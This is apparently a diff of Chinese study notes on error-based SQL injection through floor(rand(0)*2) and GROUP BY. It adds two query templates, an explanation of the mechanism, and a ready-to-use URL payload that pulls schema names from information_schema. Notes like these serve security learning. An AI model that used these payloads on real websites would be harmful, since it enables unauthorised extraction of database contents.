@@ -26,9 +26,20 @@
 	rand: 返回一个介于 0 到 1（不包括 0 和 1）之间的伪随机 float 值
 	group by: GROUP BY必须得配合聚合函数来用，根据字段来分类
 	**
-
+-使用
 ```
 select count(*) from [table] group by concat('~',([真正的查询语句]),'~'，floor(rand(0)*2))
 ```
 或
-　　‍
+```
+select count(*),concat_ws(char(32,58,32),([查询语句]),floor(rand(0)*2)) as a from [table] group by a
+```
+原理：简单来说就是count等聚合函数之后，如果使用分组语句，就会把查询的一部分以错误的形式显示出来
+
+```
+?id=-1' union all select count(*),2,concat( '~',(select schema_name from information_schema.schemata limit 4,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23 //获取 数据库 security 这里最好实用union all 这样，否则需要多次访问才能获取回复
+```
+![[Pasted image 20260529164648.png]]
+```
+
+```
